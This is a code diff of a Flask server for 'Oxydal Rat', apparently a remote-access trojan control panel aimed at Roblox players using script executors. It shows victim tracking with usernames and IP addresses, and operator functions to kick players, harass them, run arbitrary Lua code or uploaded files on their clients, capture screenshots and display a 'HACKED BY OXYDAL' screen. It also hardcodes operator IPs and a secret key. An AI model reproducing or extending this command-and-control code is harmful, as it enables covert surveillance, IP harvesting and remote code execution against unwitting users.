@@ -9,24 +9,21 @@ import os
 eventlet.monkey_patch()
 
 app = Flask(__name__)
-app.config["SECRET_KEY"] = "super_secret_key_change_me_123456789"
+app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
-# ===================== CONFIG =====================
-ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}  # ← Change avec tes IPs
+# === CONFIG ===
+ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}  # Change avec ton IP
 HISTORY_FILE = "history_log.json"
 PAYLOADS_FILE = "payloads.json"
-BLOCKED_IPS_FILE = "blocked_ips.json"  # Nouveau : stockage des skids
 
-# Variables globales
 connected_players = {}
 pending_kicks = {}
 pending_commands = {}
 history_log = []
-payloads = {}
-blocked_ips_log = []
+payloads = []
 
-# ===================== CHARGEMENT DES FICHIERS =====================
+# === CHARGEMENT DES FICHIERS ===
 def load_history():
     global history_log
     if os.path.exists(HISTORY_FILE):
@@ -43,101 +40,59 @@ def load_payloads():
                 payloads = json.load(f)
         except: payloads = {}
 
-def load_blocked_ips():
-    global blocked_ips_log
-    if os.path.exists(BLOCKED_IPS_FILE):
-        try:
-            with open(BLOCKED_IPS_FILE, 'r', encoding='utf-8') as f:
-                blocked_ips_log = json.load(f)
-        except: blocked_ips_log = []
-
 def save_payloads():
     try:
         with open(PAYLOADS_FILE, 'w', encoding='utf-8') as f:
             json.dump(payloads, f, ensure_ascii=False, indent=2)
     except: pass
 
-def save_blocked_ips():
-    try:
-        with open(BLOCKED_IPS_FILE, 'w', encoding='utf-8') as f:
-            json.dump(blocked_ips_log, f, ensure_ascii=False, indent=2)
-    except: pass
-
-# Chargement au démarrage
 load_history()
 load_payloads()
-load_blocked_ips()
 
-# ===================== SÉCURITÉ IP + DÉTECTION SKID =====================
-def get_client_ip():
+# === SÉCURITÉ IP ===
+def check_ip():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip and "," in ip:
         ip = ip.split(",")[0].strip()
-    return ip
+    if ip not in ALLOWED_IPS:
+        abort(403)
 
 @app.errorhandler(403)
 def access_denied(e):
-    ip = get_client_ip()
-    
-    # Enregistrement du skid (anti-flood : 1 par minute max)
-    if ip not in ALLOWED_IPS:
-        now = datetime.now()
-        entry = {
-            "ip": ip,
-            "time": now.strftime("%Y-%m-%d %H:%M:%S"),
-            "user_agent": request.headers.get("User-Agent", "Unknown")[:200],
-            "path": request.path
-        }
-        # Évite les doublons récents
-        recent = [e for e in blocked_ips_log[:20] if e["ip"] == ip]
-        if not any((now - datetime.strptime(e["time"], "%Y-%m-%d %H:%M:%S")).total_seconds() < 60 for e in recent):
-            blocked_ips_log.insert(0, entry)
-            if len(blocked_ips_log) > 1000:
-                blocked_ips_log.pop()
-            save_blocked_ips()
-            socketio.emit("skid_update", {"blocked": blocked_ips_log[:50]})
-
-    return f"""
-    <html>
-        <body style="background:#0f172a;color:#06b6d4;font-family:monospace;text-align:center;padding-top:15%">
-            <h1>Accès refusé</h1>
-            <p>Ton IP : <b>{ip}</b></p>
-            <p><small>Tu n'es pas autorisé • Skid détecté</small></p>
-        </body>
-    </html>
-    """, 403
+    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
+    if detected and "," in detected:
+        detected = detected.split(",")[0].strip()
+    return f"<html><body style='background:#0f172a;color:#06b6d4;font-family:monospace;text-align:center;padding-top:15%'><h1>Accès refusé</h1><p>Ton IP : <b>{detected}</b></p></body></html>", 403
 
 @app.before_request
 def protect_routes():
-    if request.path in ["/", "/kick", "/troll", "/payload", "/get_skids"] or request.path.startswith("/api"):
-        if get_client_ip() not in ALLOWED_IPS:
-            abort(403)
+    if request.path in ["/", "/kick", "/troll", "/payload", "/screenshot"] or request.path.startswith("/api"):
+        check_ip()
 
-# ===================== HISTORIQUE =====================
+# === HISTORIQUE ===
 def add_history(event_type, username, details=""):
     timestamp = datetime.now().strftime("%H:%M:%S")
     entry = {"time": timestamp, "type": event_type, "username": username, "details": details}
     history_log.insert(0, entry)
-    if len(history_log) > 100:
-        history_log.pop()
+    if len(history_log) > 100: history_log.pop()
     try:
         with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
             json.dump(history_log, f, ensure_ascii=False, indent=2)
     except: pass
     socketio.emit("history_update", {"history": history_log[:50]})
 
-# ===================== HTML + JS COMPLET =====================
+# === PAGE PRINCIPALE (HTML + CSS + JS COMPLET) ===
 HTML = """<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
 <meta charset="UTF-8">
 <title>Oxydal Rat — Wave Theme</title>
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&family=Orbitron:wght@700&family=Press+Start+2P&family=Creepster&family=Bangers&family=Nosifer&family=Monoton&family=Audiowide&family=Wallpoet&family=VT323&family=Share+Tech+Mono&family=Exo+2:wght@700&family=Rajdhani:wght@600&family=Anton&family=Bebas+Neue&family=Righteous&family=Russo+One&family=Staatliches&family=Teko:wght@600&family=Fredoka+One&family=Pacifico&family=Lobster&family=Dancing+Script:wght@700&family=Caveat&display=swap" rel="stylesheet">
 <style>
-    :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--primary-hover:#0891b2;--text:#e2e8f0;--text-muted:#94a3b8;--red:#ef4444;}
+    :root{--bg:#0f172a;--card:#1e293b;--border:#334155;--primary:#06b6d4;--primary-hover:#0891b2;--text:#e2e8f0;--text-muted:#94a3b8;}
     *{margin:0;padding:0;box-sizing:border-box;}
-    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;}
+    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;}
     .header{position:fixed;top:0;left:0;right:0;height:70px;background:rgba(15,23,42,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);z-index:1000;display:flex;align-items:center;padding:0 2rem;justify-content:space-between;}
     .logo{display:flex;align-items:center;gap:12px;font-weight:700;font-size:1.5rem;}
     .logo svg{width:40px;height:40px;fill:var(--primary);}
@@ -170,15 +125,16 @@ HTML = """<!DOCTYPE html>
     .btn:hover{transform:translateY(-4px);box-shadow:0 10px 25px rgba(6,182,212,.5);}
     .btn.kick{background:linear-gradient(135deg,#ef4444,#dc2626);}
     .btn.undo{background:#475569;}
+    .btn.screenshot{background:linear-gradient(135deg,#8b5cf6,#7c3aed);}
+    .screenshots{margin-top:40px;padding:20px;background:#1e293b;border-radius:16px;}
+    .screenshot-entry{margin:15px 0;padding:10px;background:#0f172a;border-radius:12px;}
+    .screenshot-entry img{max-width:100%;border:2px solid #06b6d4;border-radius:12px;}
     .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:2000;align-items:center;justify-content:center;}
     .modal.active{display:flex;}
     .modal-content{background:var(--card);border:2px solid var(--primary);border-radius:16px;width:90%;max-width:700px;padding:2rem;box-shadow:0 30px 80px rgba(6,182,212,.5);}
     .modal-content h2{color:var(--primary);margin-bottom:1rem;text-align:center;font-size:1.6rem;}
     input,textarea,select{width:100%;padding:14px;background:#0f172a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-family:'JetBrains Mono',monospace;}
-    .payload-list{max-height:300px;overflow-y:auto;border:1px solid var(--border);border-radius:12px;padding:10px;background:#0f172a;margin-bottom:1rem;}
-    .payload-item{cursor:pointer;padding:10px;border-radius:8px;margin-bottom:8px;background:#1e293b;transition:all .2s;}
-    .payload-item:hover{background:#334155;}
-    .payload-item.selected{background:var(--primary);color:black;}
+    .font-preview{font-family:var(--preview-font,'Inter');font-size:80px;color:var(--preview-color,#06b6d4);margin:20px 0;padding:10px;background:#0f172a;border-radius:8px;text-align:center;}
     .modal-buttons{display:flex;gap:1rem;}
     .modal-btn{flex:1;padding:14px;border:none;border-radius:12px;font-weight:600;cursor:pointer;transition:all .3s;}
     .confirm{background:var(--primary);color:white;}
@@ -187,10 +143,14 @@ HTML = """<!DOCTYPE html>
     .toast-container{position:fixed;bottom:20px;right:20px;z-index:9999;}
     .toast{background:var(--card);border-left:5px solid var(--primary);padding:1rem 1.5rem;margin-top:1rem;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,.6);animation:slideIn .4s;}
     @keyframes slideIn{from{transform:translateX(100%)}to{transform:translateX(0)}}
-    .skid-title{color:var(--red);border-bottom:2px solid var(--red);padding-bottom:8px;text-align:center;font-size:1.4rem;margin:2rem 0 1rem;}
+    .payload-list{max-height:300px;overflow-y:auto;border:1px solid var(--border);border-radius:12px;padding:10px;background:#0f172a;margin-bottom:1rem;}
+    .payload-item{cursor:pointer;padding:10px;border-radius:8px;margin-bottom:8px;background:#1e293b;transition:all .2s;}
+    .payload-item:hover{background:#334155;}
+    .payload-item.selected{background:var(--primary);color:black;}
 </style>
 </head>
 <body>
+
 <div class="header">
     <div class="logo">
         <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
@@ -198,12 +158,14 @@ HTML = """<!DOCTYPE html>
     </div>
     <div class="stats">Players online: <b id="stats">0</b></div>
 </div>
+
 <div class="main">
     <div class="sidebar">
         <div class="nav-item active" data-tab="players">Players</div>
         <div class="nav-item" data-tab="workshop">Workshop</div>
         <div class="nav-item" data-tab="history">History</div>
     </div>
+
     <div class="content">
         <div id="players-tab" class="tab active">
             <div class="search-bar"><input type="text" id="searchInput" placeholder="Search by username, ID, IP, Game, JobId..." onkeyup="filterPlayers()"></div>
@@ -213,19 +175,50 @@ HTML = """<!DOCTYPE html>
             <button class="btn" style="margin-bottom:20px;" id="newPayloadBtn">+ New Payload</button>
             <div id="payloads-list"></div>
         </div>
-        <div id="history-tab" class="tab" style="display:none;">
-            <h2 style="color:var(--primary);text-align:center;margin-bottom:1.5rem;">Historique des actions</h2>
-            <div id="history" style="margin-bottom:3rem;"></div>
-            <h2 class="skid-title">Skid détectés (<span id="skid-count">0</span>)</h2>
-            <div id="skid-list" style="max-height:60vh;overflow-y:auto;"></div>
+        <div id="history-tab" class="tab" style="display:none;"><div id="history"></div></div>
+
+        <div class="screenshots">
+            <h2 style="color:#06b6d4;margin-bottom:20px;">Screenshots reçus</h2>
+            <div id="screenshotList"></div>
         </div>
     </div>
 </div>
 
-<!-- Tous les modals (inchangés) -->
+<!-- TextScreen Modal -->
+<div class="modal" id="textScreenModal"><div class="modal-content">
+    <h2>Display Text Screen</h2>
+    <input type="text" id="screenText" placeholder="Enter text" value="HACKED BY OXYDAL">
+    <label style="color:#94a3b8;font-size:0.9rem;">Font</label>
+    <select id="textFont">
+        <option value="Arial">Arial</option>
+        <option value="Orbitron">Orbitron</option>
+        <option value="Press Start 2P">Press Start 2P</option>
+        <option value="Creepster">Creepster</option>
+        <option value="Bangers">Bangers</option>
+        <option value="Nosifer">Nosifer</option>
+        <option value="Monoton">Monoton</option>
+        <option value="Audiowide">Audiowide</option>
+        <option value="VT323">VT323</option>
+        <option value="Bebas Neue">Bebas Neue</option>
+        <option value="Righteous">Righteous</option>
+        <option value="Pacifico">Pacifico</option>
+        <option value="Lobster">Lobster</option>
+        <option value="Dancing Script">Dancing Script</option>
+    </select>
+    <label style="color:#94a3b8;font-size:0.9rem;">Color</label>
+    <input type="color" id="textColor" value="#00ff00">
+    <label style="color:#94a3b8;font-size:0.9rem;">Size (10-200)</label>
+    <input type="range" id="textSize" min="10" max="200" value="97">
+    <div class="font-preview" id="fontPreview">Preview Text</div>
+    <div class="modal-buttons">
+        <button class="modal-btn cancel">Cancel</button>
+        <button class="modal-btn confirm" id="confirmText">Display Text</button>
+    </div>
+</div></div>
+
+<!-- Autres modals -->
 <div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Reason (optional)" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmKick">Confirm Kick</button></div></div></div>
 <div class="modal" id="playSoundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmSound">Play</button></div></div></div>
-<div class="modal" id="textScreenModal"><div class="modal-content"><h2>Display Text Screen</h2><input type="text" id="screenText" placeholder="Enter text" autofocus><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmText">Display</button></div></div></div>
 <div class="modal" id="luaExecModal"><div class="modal-content"><h2>Execute Lua Script</h2><textarea id="luaScript" placeholder="Enter Lua code" style="height:180px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmLua">Execute</button></div></div></div>
 <div class="modal" id="importFileModal"><div class="modal-content"><h2>Import Lua File</h2><input type="file" id="luaFileInput" accept=".lua,.txt" style="padding:1rem;background:#0f172a;border:2px dashed var(--primary);border-radius:12px;cursor:pointer;"><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="confirmImport">Execute File</button></div></div></div>
 <div class="modal" id="payloadModal"><div class="modal-content"><h2 id="payloadModalTitle">Create Payload</h2><input type="text" id="payloadName" placeholder="Payload name"><textarea id="payloadCode" placeholder="Lua code..." style="height:200px;"></textarea><div class="modal-buttons"><button class="modal-btn cancel">Cancel</button><button class="modal-btn confirm" id="savePayload">Save</button></div></div></div>
@@ -239,13 +232,12 @@ HTML = """<!DOCTYPE html>
         <button class="modal-btn confirm" id="executeTempPayload">Execute Modified</button>
     </div>
 </div></div>
+
 <div class="toast-container" id="toasts"></div>
 
 <script>
 const socket = io();
-let currentKickId = null, currentSoundId = null, currentTextId = null, currentLuaId = null, currentImportId = null;
-let editingPayload = null;
-let selectedPayloadName = null;
+let currentKickId = null, currentSoundId = null, currentTextId = null, currentLuaId = null;
 
 // Navigation
 document.querySelectorAll('.nav-item').forEach(item => {
@@ -255,7 +247,6 @@ document.querySelectorAll('.nav-item').forEach(item => {
         item.classList.add('active');
         document.getElementById(item.dataset.tab + '-tab').style.display = 'block';
         if (item.dataset.tab === 'workshop') loadPayloads();
-        if (item.dataset.tab === 'history') fetch("/get_skids").then(r => r.json()).then(renderSkids);
     });
 });
 
@@ -265,7 +256,6 @@ function toast(msg) {
     setTimeout(() => t.remove(), 4000);
 }
 
-// Recherche joueurs
 function filterPlayers() {
     const query = document.getElementById("searchInput").value.toLowerCase();
     document.querySelectorAll('.card').forEach(card => {
@@ -274,11 +264,52 @@ function filterPlayers() {
     });
 }
 
-// Workshop
+// TextScreen Preview
+function updatePreview() {
+    const text = document.getElementById("screenText").value || "Preview Text";
+    const font = document.getElementById("textFont").value;
+    const color = document.getElementById("textColor").value;
+    const size = document.getElementById("textSize").value;
+    const preview = document.getElementById("fontPreview");
+    preview.textContent = text;
+    preview.style.fontFamily = font;
+    preview.style.color = color;
+    preview.style.fontSize = size + "px";
+}
+document.getElementById("screenText").addEventListener("input", updatePreview);
+document.getElementById("textFont").addEventListener("change", updatePreview);
+document.getElementById("textColor").addEventListener("input", updatePreview);
+document.getElementById("textSize").addEventListener("input", updatePreview);
+
+document.getElementById("confirmText").addEventListener("click", () => {
+    const text = document.getElementById("screenText").value.trim();
+    if (!text) return toast("Enter text");
+    const payload = JSON.stringify({
+        styled: true,
+        text: text,
+        font: document.getElementById("textFont").value,
+        color: document.getElementById("textColor").value,
+        size: parseInt(document.getElementById("textSize").value)
+    });
+    sendTroll(currentTextId, "textscreen", payload);
+    document.getElementById("textScreenModal").classList.remove("active");
+});
+
+function openTextScreenModal(id){
+    currentTextId = id;
+    document.getElementById("screenText").value = "HACKED BY OXYDAL";
+    document.getElementById("textFont").value = "Pacifico";
+    document.getElementById("textColor").value = "#00ff00";
+    document.getElementById("textSize").value = 97;
+    updatePreview();
+    document.getElementById("textScreenModal").classList.add("active");
+}
+
+// Payloads
 function loadPayloads() {
     fetch("/payload?action=list").then(r => r.json()).then(data => {
         const list = document.getElementById("payloads-list");
-        list.innerHTML = Object.keys(data).length === 0 ? "<p style='color:#94a3b8'>No payload yet. Create one!</p>" : "";
+        list.innerHTML = Object.keys(data).length === 0 ? "<p style='color:#94a3b8'>Aucun payload. Crée-en un !</p>" : "";
         for (const [name, code] of Object.entries(data)) {
             const div = document.createElement("div");
             div.className = "payload-item";
@@ -290,132 +321,48 @@ function loadPayloads() {
     });
 }
 
-document.getElementById("newPayloadBtn").addEventListener("click", () => {
-    editingPayload = null;
-    document.getElementById("payloadModalTitle").textContent = "Create Payload";
-    document.getElementById("payloadName").value = "";
-    document.getElementById("payloadCode").value = "";
-    document.getElementById("payloadModal").classList.add("active");
-});
+function renderHistory(data) {
+    document.getElementById("history").innerHTML = data.history.map(h => 
+        `<div class="payload-item"><strong>[${h.time}] ${h.username}</strong><br><span style="color:#94a3b8">${h.details}</span></div>`
+    ).join('');
+}
 
-window.editPayload = function(name) {
-    fetch("/payload?action=get&name=" + encodeURIComponent(name)).then(r => r.json()).then(d => {
-        editingPayload = name;
-        document.getElementById("payloadModalTitle").textContent = "Edit Payload";
-        document.getElementById("payloadName").value = name;
-        document.getElementById("payloadCode").value = d.code;
-        document.getElementById("payloadModal").classList.add("active");
-    });
-};
-
-window.deletePayload = function(name) {
-    if (confirm("Delete payload " + name + " ?")) {
-        fetch("/payload", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({action:"delete",name})})
-            .then(() => { toast("Payload deleted"); loadPayloads(); });
+function sendTroll(id, cmd, param = null) {
+    const body = { userid: id, cmd };
+    if (param) {
+        if (cmd === "playsound") body.assetId = param;
+        else if (cmd === "textscreen") body.text = param;
+        else if (cmd === "luaexec") body.script = param;
     }
-};
+    fetch("/troll", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
+    toast(cmd.toUpperCase() + " envoyé");
+}
 
-document.getElementById("savePayload").addEventListener("click", () => {
-    const name = document.getElementById("payloadName").value.trim();
-    const code = document.getElementById("payloadCode").value;
-    if (!name || !code) return toast("Name and code required");
-    fetch("/payload", {method:"POST",headers:{"Content-Type":"application/json"},
-        body: JSON.stringify({action: editingPayload ? "update" : "create", name, code, oldname: editingPayload})
-    }).then(() => {
-        toast(editingPayload ? "Payload updated" : "Payload created");
-        document.getElementById("payloadModal").classList.remove("active");
-        loadPayloads();
-    });
+socket.on("new_screenshot", data => {
+    const div = document.createElement("div");
+    div.className = "screenshot-entry";
+    div.innerHTML = `<strong>[${data.time}] ${data.username} (${data.userid})</strong><br><img src="${data.image}" alt="screenshot">`;
+    document.getElementById("screenshotList").prepend(div);
+    toast("Screenshot reçu !");
 });
 
-// Payload selector
-window.openPayloadSelector = function(id) {
-    currentLuaId = id;
-    fetch("/payload?action=list").then(r => r.json()).then(data => {
-        const list = document.getElementById("payloadList");
-        list.innerHTML = "";
-        if (Object.keys(data).length === 0) {
-            list.innerHTML = "<p style='color:#94a3b8;text-align:center'>No payload available</p>";
-        } else {
-            for (const name of Object.keys(data)) {
-                const item = document.createElement("div");
-                item.className = "payload-item";
-                item.textContent = name;
-                item.onclick = () => {
-                    document.querySelectorAll('#payloadList .payload-item').forEach(i => i.classList.remove('selected'));
-                    item.classList.add('selected');
-                    selectedPayloadName = name;
-                    fetch("/payload?action=get&name=" + encodeURIComponent(name)).then(r => r.json()).then(d => {
-                        document.getElementById("tempPayloadCode").value = d.code;
-                    });
-                };
-                list.appendChild(item);
-            }
+function render(data) {
+    document.getElementById("stats").innerText = data.online;
+    const grid = document.getElementById("players");
+    const currentIds = new Set(Object.keys(data.players));
+    Object.entries(data.players).forEach(([id, p]) => {
+        let card = document.getElementById(`card_${id}`);
+        if (!card) {
+            card = document.createElement("div");
+            card.className = "card";
+            card.id = `card_${id}`;
+            grid.appendChild(card);
         }
-        document.getElementById("tempPayloadCode").value = "";
-        document.getElementById("payloadSearch").value = "";
-        document.getElementById("executePayloadModal").classList.add("active");
-    });
-};
-
-function filterPayloads() {
-    const query = document.getElementById("payloadSearch").value.toLowerCase();
-    document.querySelectorAll('#payloadList .payload-item').forEach(item => {
-        item.style.display = item.textContent.toLowerCase().includes(query) ? "block" : "none";
-    });
-}
-
-document.getElementById("executeTempPayload").addEventListener("click", () => {
-    const code = document.getElementById("tempPayloadCode").value.trim();
-    if (!code) return toast("No code to execute");
-    if (!currentLuaId) return toast("No player selected");
-    sendTroll(currentLuaId, "luaexec", code);
-    document.getElementById("executePayloadModal").classList.remove("active");
-});
-
-// Modals
-function openKickModal(id){currentKickId=id;document.getElementById("kickModal").classList.add("active");document.getElementById("kickReason").focus();}
-function openPlaySoundModal(id){currentSoundId=id;document.getElementById("playSoundModal").classList.add("active");}
-function openTextScreenModal(id){currentTextId=id;document.getElementById("textScreenModal").classList.add("active");}
-function openLuaExecModal(id){currentLuaId=id;document.getElementById("luaExecModal").classList.add("active");}
-function openImportFileModal(id){currentImportId=id;document.getElementById("importFileModal").classList.add("active");}
-
-document.querySelectorAll('.modal .cancel').forEach(b => b.addEventListener("click", () => b.closest('.modal').classList.remove("active")));
-
-function sendTroll(id,cmd,param=null){
-    const body={userid:id,cmd};
-    if(param){
-        if(cmd==="playsound") body.assetId=param;
-        else if(cmd==="textscreen") body.text=param;
-        else if(cmd==="luaexec") body.script=param;
-    }
-    fetch("/troll",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)});
-    toast(cmd.toUpperCase()+" sent");
-}
-
-document.getElementById("confirmKick").addEventListener("click",()=>{const r=document.getElementById("kickReason").value.trim()||"Kicked by admin";fetch("/kick",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:currentKickId,reason:r})});toast("KICK sent");document.getElementById("kickModal").classList.remove("active");});
-document.getElementById("confirmSound").addEventListener("click",()=>{const a=document.getElementById("soundAssetId").value.trim();if(a)sendTroll(currentSoundId,"playsound",a);document.getElementById("playSoundModal").classList.remove("active");});
-document.getElementById("confirmText").addEventListener("click",()=>{const t=document.getElementById("screenText").value.trim();if(t)sendTroll(currentTextId,"textscreen",t);document.getElementById("textScreenModal").classList.remove("active");});
-document.getElementById("confirmLua").addEventListener("click",()=>{const s=document.getElementById("luaScript").value.trim();if(s)sendTroll(currentLuaId,"luaexec",s);document.getElementById("luaExecModal").classList.remove("active");});
-document.getElementById("confirmImport").addEventListener("click",()=>{
-    const f=document.getElementById("luaFileInput").files[0];
-    if(!f)return toast("Select a file");
-    const r=new FileReader();
-    r.onload=e=>{sendTroll(currentImportId,"luaexec",e.target.result);document.getElementById("importFileModal").classList.remove("active");document.getElementById("luaFileInput").value="";};
-    r.readAsText(f);
-});
-
-function render(data){
-    document.getElementById("stats").innerText=data.online;
-    const grid=document.getElementById("players");
-    const currentIds=new Set(Object.keys(data.players));
-    Object.entries(data.players).forEach(([id,p])=>{
-        let card=document.getElementById(`card_${id}`);
-        if(!card){card=document.createElement("div");card.className="card";card.id=`card_${id}`;grid.appendChild(card);}
-        card.innerHTML=`
-            <div class="status"><div class="dot ${p.online?"online":""}"></div><span>${p.online?"Online":"Offline"}</span></div>
+        card.innerHTML = `
+            <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
             <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
             <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a><br>JobId: ${p.jobId || "N/A"}</div>
+
             <div class="category">TROLLS</div>
             <div class="btn-grid">
                 <button class="btn kick" onclick="openKickModal('${id}')">KICK</button>
@@ -427,7 +374,9 @@ function render(data){
                 <button class="btn" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                 <button class="btn" onclick="openPlaySoundModal('${id}')">PLAY SOUND</button>
                 <button class="btn" onclick="openTextScreenModal('${id}')">TEXT SCREEN</button>
+                <button class="btn screenshot" onclick="sendTroll('${id}','screenshot')">SCREENSHOT</button>
             </div>
+
             <div class="category">UNDO</div>
             <div class="btn-grid">
                 <button class="btn undo" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
@@ -437,6 +386,7 @@ function render(data){
                 <button class="btn undo" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
                 <button class="btn undo" onclick="sendTroll('${id}','hidetext')">HIDE TEXT</button>
             </div>
+
             <div class="category">LUA EXEC</div>
             <div class="btn-grid" style="grid-template-columns:1fr 1fr 1fr">
                 <button class="btn" onclick="openImportFileModal('${id}')">IMPORT FILE</button>
@@ -445,47 +395,19 @@ function render(data){
             </div>
         `;
     });
-    document.querySelectorAll('.card').forEach(c=>{if(!currentIds.has(c.id.replace('card_','')))c.remove();});
-}
-
-function renderHistory(data){
-    document.getElementById("history").innerHTML = data.history.map(h=>`<div class="payload-item"><strong>[${h.time}] ${h.username}</strong><br><span style="color:#94a3b8">${h.details}</span></div>`).join('');
-}
-
-// SKID RENDER
-function renderSkids(data) {
-    const list = document.getElementById("skid-list");
-    const count = document.getElementById("skid-count");
-    if (!data.blocked || data.blocked.length === 0) {
-        list.innerHTML = `<p style="text-align:center;color:#94a3b8;padding:2rem;">Aucun skid détecté • GG aux vrais</p>`;
-        count.textContent = "0";
-        return;
-    }
-    count.textContent = data.blocked.length;
-    list.innerHTML = data.blocked.map(e => `
-        <div class="payload-item" style="border-left:5px solid #ef4444;background:#2d1b23;">
-            <strong style="color:#fca5a5;">${e.ip}</strong>
-            <span style="color:#94a3b8;font-size:0.8rem;margin-left:10px;">${e.time}</span>
-            <div style="font-size:0.75rem;color:#64748b;margin-top:4px;word-break:break-all;">
-                ${e.user_agent !== "Unknown" ? e.user_agent.substring(0,100)+(e.user_agent.length>100?"...":"") : ""}
-                ${e.path ? " • "+e.path : ""}
-            </div>
-        </div>
-    `).join('');
+    document.querySelectorAll('.card').forEach(c => {
+        if (!currentIds.has(c.id.replace('card_', ''))) c.remove();
+    });
 }
 
 socket.on("update", render);
 socket.on("history_update", renderHistory);
 socket.on("kick_notice", d => toast(d.username + " → " + d.reason));
-socket.on("skid_update", renderSkids);
-
-fetch("/get_history").then(r=>r.json()).then(renderHistory);
-fetch("/get_skids").then(r=>r.json()).then(renderSkids);
+fetch("/get_history").then(r => r.json()).then(renderHistory);
 </script>
 </body>
 </html>"""
 
-# ===================== ROUTES =====================
 @app.route("/")
 def index():
     return render_template_string(HTML)
@@ -493,10 +415,6 @@ def index():
 @app.route("/get_history")
 def get_history():
     return jsonify({"history": history_log[:50]})
-
-@app.route("/get_skids")
-def get_skids():
-    return jsonify({"blocked": blocked_ips_log[:100]})
 
 @app.route("/api", methods=["GET", "POST"])
 def api():
@@ -537,6 +455,7 @@ def api():
 
 @app.route("/kick", methods=["POST"])
 def kick():
+    check_ip()
     data = request.get_json() or {}
     uid = str(data.get("userid", ""))
     reason = data.get("reason", "No reason")
@@ -548,29 +467,51 @@ def kick():
 
 @app.route("/troll", methods=["POST"])
 def troll():
+    check_ip()
     data = request.get_json() or {}
     uid = str(data.get("userid", ""))
     cmd = data.get("cmd", "")
     if uid and cmd:
         cmd_data = {"cmd": cmd}
         details = f"{cmd.upper()}"
-        if "assetId" in data:
+        if cmd == "screenshot":
+            details = "SCREENSHOT demandé"
+        elif "assetId" in data:
             cmd_data["assetId"] = data["assetId"]
             details += f" (Asset: {data['assetId']})"
         elif "text" in data:
             cmd_data["text"] = data["text"]
-            details += f" (Text: {data['text']})"
+            details += " (Styled Text)"
         elif "script" in data:
             cmd_data["script"] = data["script"]
             details += f" (Script: {len(data['script'])} chars)"
         pending_commands[uid] = cmd_data
         name = connected_players.get(uid, {}).get("username", "Unknown")
         add_history("action", name, details)
-        socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
     return jsonify({"sent": True})
+
+@app.route("/screenshot", methods=["POST"])
+def receive_screenshot():
+    check_ip()
+    data = request.get_json() or {}
+    userid = data.get("userid", "unknown")
+    username = data.get("username", "unknown")
+    image_url = data.get("image", "")
+
+    if image_url and image_url.startswith("rbxthumb://"):
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        socketio.emit("new_screenshot", {
+            "time": timestamp,
+            "username": username,
+            "userid": userid,
+            "image": image_url
+        })
+        add_history("screenshot", username, "Screenshot reçu")
+    return jsonify({"ok": True})
 
 @app.route("/payload", methods=["GET", "POST"])
 def payload_manager():
+    check_ip()
     if request.method == "GET":
         action = request.args.get("action")
         if action == "list": return jsonify(payloads)
@@ -592,7 +533,6 @@ def payload_manager():
         return jsonify({"ok": True})
     return jsonify({"error": "invalid"})
 
-# ===================== BACKGROUND LOOP =====================
 def broadcast_loop():
